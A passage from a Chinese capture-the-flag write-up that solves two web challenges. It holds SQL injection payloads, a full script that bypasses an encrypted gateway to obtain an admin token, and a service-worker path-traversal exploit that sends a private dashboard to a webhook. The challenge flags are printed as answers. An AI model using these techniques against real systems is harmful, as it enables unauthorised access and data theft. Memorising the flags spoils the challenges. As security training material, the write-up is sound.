node ghost_zero_client.js search "' UNION SELECT 1,group_concat(name),3 FROM sqlite_master --"
```

关键输出如下：

```json
{
  "id": 1,
  "summary": 3,
  "title": "knowledge_base,logs??,User,q_8f3c1a72d90e4b65"
}
```

继续读取建表语句，确认隐藏表 `q_8f3c1a72d90e4b65` 的字段名为 `r4` ：

```bash
GHOST_ZERO_BASE=https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf \
node ghost_zero_client.js search "' UNION SELECT 1,group_concat(sql,'||'),3 FROM sqlite_master --"
```

关键输出：

```json
{
  "id": 1,
  "summary": 3,
  "title": "CREATE TABLE knowledge_base (\n    id INTEGER PRIMARY KEY,\n    title TEXT NOT NULL,\n    summary TEXT NOT NULL\n  )||CREATE TABLE \"logs??\" (\n    id INTEGER PRIMARY KEY,\n    \"text???\" TEXT NOT NULL\n  )||CREATE TABLE User (\n    id INTEGER PRIMARY KEY,\n    username TEXT NOT NULL,\n    hash TEXT NOT NULL\n  )||CREATE TABLE \"q_8f3c1a72d90e4b65\" (\n    id INTEGER PRIMARY KEY,\n    \"r4\" TEXT NOT NULL\n  )"
}
```

读取隐藏表内容后，可以拿到四个 pcap 元数据和下载路径：

```bash
GHOST_ZERO_BASE=https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf \
node ghost_zero_client.js search "' UNION SELECT id,r4,3 FROM q_8f3c1a72d90e4b65 --"
```

关键输出中包含：

```json
{
  "id": 1,
  "summary": 3,
  "title": "{\"tag\":\"traffic-capture\",\"kind\":\"http\",\"label\":\"frontdesk-health-and-index\",\"note\":\"plain HTTP archive terminal background traffic\",\"storagePath\":\"/app/data/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap\",\"downloadPath\":\"/test/7f9c18a2e44d/5d0185499f64d3116843ddcb3dd16344.pcap\",\"bytes\":1350,\"sha256\":\"2f3020c9e47b6e88910118bb8f7fb7b7a1b0d1cb4f7ddc1a44ad3fb2aa387b44\"}"
}
{
  "id": 2,
  "summary": 3,
  "title": "{\"tag\":\"traffic-capture\",\"kind\":\"http\",\"label\":\"guest-session-help\",\"note\":\"plain HTTP guest session and help lookup\",\"storagePath\":\"/app/data/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap\",\"downloadPath\":\"/test/7f9c18a2e44d/04f9654471407af9db118e1cb7333bba.pcap\",\"bytes\":1356,\"sha256\":\"d558839bec55aa51660ed65d6ae42697377f29bd65f54e950bbe1a0d6c834abb\"}"
}
{
  "id": 3,
  "summary": 3,
  "title": "{\"tag\":\"traffic-capture\",\"kind\":\"encrypted-com-over-http\",\"label\":\"desktop-searches\",\"note\":\"plain HTTP carrying encryptedCom envelopes for normal search requests\",\"storagePath\":\"/app/data/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap\",\"downloadPath\":\"/test/7f9c18a2e44d/73cfa9f8eafad4b574970ae9ced11c67.pcap\",\"bytes\":3250,\"sha256\":\"850cc4fbaec3d35b97381692b41842def2a7d08030cfbd71575434cd390f302e\"}"
}
{
  "id": 4,
  "summary": 3,
  "title": "{\"tag\":\"traffic-capture\",\"kind\":\"encrypted-com-over-http\",\"label\":\"mobile-searches\",\"note\":\"plain HTTP carrying encryptedCom envelopes for normal search requests\",\"storagePath\":\"/app/data/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap\",\"downloadPath\":\"/test/7f9c18a2e44d/d418e1a02f2f607a3d0f23a3cc1b9091.pcap\",\"bytes\":3263,\"sha256\":\"0b9b129aa28776bf759aa8f32ad8f6712f2468ea30a5de05873c67e9e8406f14\"}"
}
```

这四份抓包只能看到公开接口和两段 ECDH + AES-GCM 加密通信，单靠它们无法直接恢复明文。继续向下挖数据库页内容，隐藏点出现在 `sqlite_dbpage` 。读取第 5 页原始页数据：

```bash
GHOST_ZERO_BASE=https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf \
node ghost_zero_client.js search "' UNION SELECT 1,quote(data),3 FROM sqlite_dbpage WHERE pgno=5 --"
```

返回的十六进制页数据里能直接看到一条已经删除的 JSON 记录，关键片段如下：

```latex
{"tag":"Ghost_Zero","deleted":true,"storagePath":"/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","downloadPath":"/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","bytes":3048,"sha256":"1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b"}
```

根据这条残留记录下载删除抓包：

```bash
curl -L "https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap" -o ghost_zero_deleted.pcap
Get-FileHash .\ghost_zero_deleted.pcap -Algorithm SHA256
```

输出哈希与数据库页中的记录一致：

```latex
SHA256  1829670B437F5D952DF05BB7B4440772372E83C22EC799452D5DA08A7957204B
```

再用 `tshark` 提取这份抓包中的 HTTP 明文请求和响应：

```bash
"D:\tools\Wireshark\tshark.exe" -r .\ghost_zero_deleted.pcap -Y "http.request or http.response" -T fields -e frame.number -e http.request.method -e http.request.uri -e http.response.code -e http.file_data
```

关键输出如下：

```latex
4  GET   /health
5               200  {"ok":true,"build":"legacy-console-0.8.4"}
6  POST  /ddddddtestStat       {"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}
7               200  {"exchangeTicket":"<legacy ticket>","scope":"admin-bootstrap","grantType":"legacy-bootstrap","expiresIn":180}
8  POST  /api/auth/exchange    {"ticket":"<legacy ticket>","grantType":"legacy-bootstrap"}
9               200  {"token":"<legacy admin token>","tokenType":"Bearer","expiresIn":1800}
```

这一步证明了解题链路并不是去破解当前的 ECDH 或 RSA，而是找到一个旧的引导接口：先调用 `/ddddddtestStat` 拿 `exchangeTicket` ，再把 ticket 送到 `/api/auth/exchange` 换成管理员 token。

但直接访问当前实例的 `/ddddddtestStat` 并不存在，前面的抓包也说明正常前端通信都经过 `/api/gateway` 。因此接下来要做的是复现前端的加密传输，看看旧接口是不是被藏在 gateway 的 `target` 字段后面。

本题前端的核心流程是：

1.  `POST /api/session/guest` 领取 guest access token。
2.  `POST /api/transport/bootstrap` 用浏览器生成的 P-256 公钥与服务端做 ECDH。
3.  使用 HKDF-SHA256 从共享秘密和 `salt` 派生 `ghost-packet:c2s` 、 `ghost-packet:s2c` 两把 AES-GCM 密钥。
4.  按前端稳定序列化规则加密 `{"target":...,"body":...}` ，再发往 `/api/gateway` 。

下面的脚本完整复现了这一流程，并直接命中隐藏 target `/ddddddtestStat` ，随后再调用 `/api/auth/exchange` 与 `/api/flag` ：

```javascript
const crypto = require('crypto');

const base = 'https://r3gdex54wethtgbuhsdtvu3j334.cloud.d3c.tf';
const encoder = new TextEncoder();
const decoder = new TextDecoder();

function stableStringify(v) {
  if (v === null || typeof v !== 'object') return JSON.stringify(v);
  if (Array.isArray(v)) return `[${v.map(stableStringify).join(',')}]`;
  return `{${Object.keys(v).sort().filter(k => v[k] !== undefined).map(k => `${JSON.stringify(k)}:${stableStringify(v[k])}`).join(',')}}`;
}

function b64uToBuf(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  s = s.padEnd(Math.ceil(s.length / 4) * 4, '=');
  return Buffer.from(s, 'base64');
}

function bufToB64u(b) {
  return Buffer.from(b).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

async function derive(secret, salt, info, usages) {
  const km = await crypto.webcrypto.subtle.importKey('raw', secret, 'HKDF', false, ['deriveKey']);
  return crypto.webcrypto.subtle.deriveKey(
    { name: 'HKDF', hash: 'SHA-256', salt, info: encoder.encode(info) },
    km,
    { name: 'AES-GCM', length: 256 },
    false,
    usages,
  );
}

async function bootstrap() {
  const guest = await fetch(`${base}/api/session/guest`, {
    method: 'POST',
    headers: { Accept: 'application/json' },
  }).then(r => r.json());

  const ecdh = await crypto.webcrypto.subtle.generateKey(
    { name: 'ECDH', namedCurve: 'P-256' },
    true,
    ['deriveBits'],
  );
  const pub = await crypto.webcrypto.subtle.exportKey('jwk', ecdh.publicKey);

  const transport = await fetch(`${base}/api/transport/bootstrap`, {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      Authorization: `Bearer ${guest.token}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ clientPublicKey: pub }),
  }).then(r => r.json());

  const serverPub = await crypto.webcrypto.subtle.importKey(
    'jwk',
    transport.serverPublicKey,
    { name: 'ECDH', namedCurve: 'P-256' },
    true,
    [],
  );
  const shared = await crypto.webcrypto.subtle.deriveBits(
    { name: 'ECDH', public: serverPub },
    ecdh.privateKey,
    256,
  );
  const salt = b64uToBuf(transport.salt);

  return {
    guest,
    transport,
    token: guest.token,
    sid: transport.sid,
    seq: 0,
    enc: await derive(shared, salt, 'ghost-packet:c2s', ['encrypt']),
    dec: await derive(shared, salt, 'ghost-packet:s2c', ['decrypt']),
  };
}

async function gateway(state, target, body) {
  state.seq += 1;
  const ts = Date.now();
  const iv = crypto.randomBytes(12);
  const aad = encoder.encode(stableStringify({
    direction: 'c2s',
    seq: state.seq,
    sid: state.sid,
    ts,
    v: 1,
  }));
  const pt = encoder.encode(stableStringify({ target, body }));
  const ct = await crypto.webcrypto.subtle.encrypt(
    { name: 'AES-GCM', iv, additionalData: aad, tagLength: 128 },
    state.enc,
    pt,
  );

  const raw = await fetch(`${base}/api/gateway`, {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      Authorization: `Bearer ${state.token}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      v: 1,
      sid: state.sid,
      seq: state.seq,
      ts,
      iv: bufToB64u(iv),
      ct: bufToB64u(Buffer.from(ct)),
    }),
  }).then(r => r.json());

  const ra = encoder.encode(stableStringify({
    direction: 's2c',
    seq: raw.seq,
    sid: raw.sid,
    ts: raw.ts,
    v: raw.v,
  }));
  const dec = await crypto.webcrypto.subtle.decrypt(
    { name: 'AES-GCM', iv: b64uToBuf(raw.iv), additionalData: ra, tagLength: 128 },
    state.dec,
    b64uToBuf(raw.ct),
  );
  return { raw, dec: JSON.parse(decoder.decode(dec)) };
}

async function main() {
  const state = await bootstrap();
  console.log('GUEST', JSON.stringify(state.guest));
  console.log('TRANSPORT', JSON.stringify(state.transport));

  const hidden = await gateway(
    state,
    '/ddddddtestStat',
    { principal: 'ops-root', mode: 'bootstrap', credentialType: 'temporary' },
  );
  console.log('HIDDEN_DEC', JSON.stringify(hidden.dec));

  const ticket = hidden.dec.data.exchangeTicket;
  const exchanged = await fetch(`${base}/api/auth/exchange`, {
    method: 'POST',
    headers: { Accept: 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify({ ticket, grantType: 'legacy-bootstrap' }),
  });
  const exchangeText = await exchanged.text();
  console.log('EXCHANGE', exchanged.status, exchangeText);

  const adminToken = JSON.parse(exchangeText).token;
  const flagResp = await fetch(`${base}/api/flag`, {
    headers: { Authorization: `Bearer ${adminToken}` },
  });
  console.log('FLAG', flagResp.status, await flagResp.text());
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
```

运行：

```bash
node solve.js
```

实际输出如下。先是 guest token 与 ECDH 协商结果：

```latex
GUEST {"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByaW1hcnktcnMyNTYifQ....","tokenType":"Bearer","expiresIn":1800}
TRANSPORT {"sid":"dcd196e2-ca92-4628-9a4f-611e0263b766","serverPublicKey":{"key_ops":[],"ext":true,"kty":"EC","x":"PP2615O8ODrpIEgPSikS-x_zFDiNQl2GbXV8VJOkCqU","y":"DPOEh0FnEEu1deTrT1jy7MddT6p5a6J2NdGjHBX8s2M","crv":"P-256"},"salt":"uV1w5ix84_wKqxrCWn9ecA","expiresIn":1200}
```

再是隐藏接口 `/ddddddtestStat` 经由 gateway 返回的解密结果：

```latex
HIDDEN_DEC {"data":{"exchangeTicket":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByaW1hcnktcnMyNTYifQ....","expiresIn":180,"grantType":"legacy-bootstrap","scope":"session"},"ok":true}
```

把这个 `exchangeTicket` 交给 `/api/auth/exchange` 后，服务端返回管理员 access token：

```latex
EXCHANGE 200 {"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByaW1hcnktcnMyNTYifQ.eyJ0eXAiOiJhY2Nlc3MiLCJyb2xlIjoiYWRtaW4iLCJzdWIiOiJvcHMtcm9vdCIsImlzcyI6Imdob3N0LXBhY2tldC1hdXRoIiwiYXVkIjoiZ2hvc3QtcGFja2V0LWFwaSIsImlhdCI6MTc4NTA3NTg0OCwianRpIjoiZjcwZTg4YTEtNGEyNS00YWZlLWFjOGMtYTg3ZWE1YTkyNjI4IiwiZXhwIjoxNzg1MDc3NjQ4fQ....","tokenType":"Bearer","expiresIn":1800}
```

解码这枚 JWT 的 payload 可以看到 `role` 已经是 `admin` ， `sub` 为 `ops-root` 。最后带着它请求 `/api/flag` ：

```latex
FLAG 200 {"flag":"d3ctf{SE@rCHFor_hldden_z3r0_ghO5T_1NTerf@C3-cr4cKitrlGHtyeah0}"}
```

因此本题的关键不是硬解加密流量，而是通过 SQL 注入挖出隐藏抓包，再从删除抓包中恢复旧版授权链，最后在当前实例的加密网关里命中隐藏 target `/ddddddtestStat` ，用它合法领取 `exchangeTicket` 并换取管理员 token。

最终结果为：

```latex
d3ctf{SE@rCHFor_hldden_z3r0_ghO5T_1NTerf@C3-cr4cKitrlGHtyeah0}
```

### Scope Drift

#### 题目描述

题目提供名为MiniStatic的静态托管站点，复现实例为 `https://rtunnctcmlteigsea76pzn7lshy.cloud.d3c.tf` 。访客只能向 `/u/guest/` 上传静态文件，并可通过 `/bot` 提交一个 `guest` 页面供 `reviewer` 访问。 `reviewer` 打开提交页面后，会继续访问私有的 `/u/admin/dashboard` 。目标是利用该浏览器流程读取 `dashboard` 中的部署记录。

#### 分析过程

上传接口对路径只进行了一次解码并检查是否仍位于 `/u/guest/` 。因此将脚本上传到 `/u/guest/%252e%252e/admin/preload.js` 时，文件列表中保存的路径是 `/u/guest/%2e%2e/admin/preload.js` 。在浏览器中注册脚本时使用单层编码路径：

```javascript
navigator.serviceWorker.register('/u/guest/%2e%2e/admin/preload.js')
```

URL规范化会将该脚本URL解释为 `/u/admin/preload.js` 。未显式指定 `scope` 时，Service Worker默认作用域就是脚本所在目录 `/u/admin/` ，因此 `guest` 页面可以控制之后对 `/u/admin/dashboard` 的导航请求。

直接在 `worker` 中使用 `fetch(event.request)` 读取 `dashboard` 会得到未授权响应。同一实例上将普通 `fetch` 结果写回 `webhook` ，关键输出如下：

```latex
DIRECT status=403 body=forbidden
```

这里不能丢弃浏览器在 `worker` 接管前已经发出的导航请求：在 `activate` 事件中启用 `navigationPreload` 后，导航请求对应的真实预加载响应可由 `event.preloadResponse` 取得。该响应与普通 `worker` 内 `fetch` 不是同一条请求路径。

`bot` 访问 `guest` 页面、 `worker` 激活、 `bot` 导航到 `dashboard` 的时序由题目流程保证。 `worker` 对 `/u/admin/dashboard` 的 `fetch` 事件只读取 `event.preloadResponse` ，复制响应体后通过题目提供的 `/webhook/guest` 写回。下面的PowerShell脚本完成上传、提交和结果读取；将 `$base` 改为当前实例即可复现。

```powershell
$base = 'https://rtunnctcmlteigsea76pzn7lshy.cloud.d3c.tf'

$sw = @'
async function log(m) {
  try {
    await fetch('/webhook/guest', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'data=' + encodeURIComponent(m),
    });
  } catch (_) {}
}

self.addEventListener('install', event => event.waitUntil(self.skipWaiting()));
self.addEventListener('activate', event => event.waitUntil((async () => {
  await self.registration.navigationPreload.enable();
  const state = await self.registration.navigationPreload.getState();
  await log('NP-STATE enabled=' + state.enabled);
  await self.clients.claim();
})()));

self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.pathname.startsWith('/webhook/guest')) {
    event.respondWith(fetch(event.request));
    return;
  }

  if (url.pathname === '/u/admin/dashboard') {
    event.respondWith((async () => {
      const response = await event.preloadResponse;
      if (response) {
        const body = await response.clone().text();
        await log('NP-PRELOAD status=' + response.status +
          ' url=' + response.url + ' body=' + body);
        return response;
      }
      return fetch(event.request);
    })());
    return;
  }

  event.respondWith(fetch(event.request));
});
'@

$page = @'
<!doctype html><meta charset="utf-8">
<script>
(async () => {
  await navigator.serviceWorker.register('/u/guest/%2e%2e/admin/preload.js');
  await navigator.serviceWorker.ready;
})();
</script>
'@

curl.exe -sS -X POST "$base/upload" `
  --data-urlencode 'path=/u/guest/%252e%252e/admin/preload.js' `
  --data-urlencode ("content=" + $sw)

curl.exe -sS -X POST "$base/upload" `
  --data-urlencode 'path=/u/guest/preload.html' `
  --data-urlencode ("content=" + $page)

curl.exe -sS -G "$base/bot" `
  --data-urlencode 'url=http://rtunnctcmlteigsea76pzn7lshy.cloud.d3c.tf/u/guest/preload.html'

Start-Sleep -Seconds 5
curl.exe -sS "$base/inbox" | Select-String 'NP-STATE|NP-PRELOAD'
```

运行后先看到 `worker` 已启用 `navigationPreload` ：

```latex
NP-STATE enabled=true
```

`dashboard` 导航的预加载响应状态为 `200` ，响应体包含 `reviewer` 的私有部署记录：

```latex
NP-PRELOAD status=200 url=http://localhost:3000/u/admin/dashboard body=<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Dashboard</title></head>
<body>
  <h1>Admin Dashboard</h1>
  <p>Private deployment note: <code>d3ctf{SErV1Ce_WOrk3R-sc0pE_coNfusION2402ec3}</code></p>
</body>
</html>
```

因此最终flag为：

```latex
d3ctf{SErV1Ce_WOrk3R-sc0pE_coNfusION2402ec3}
```
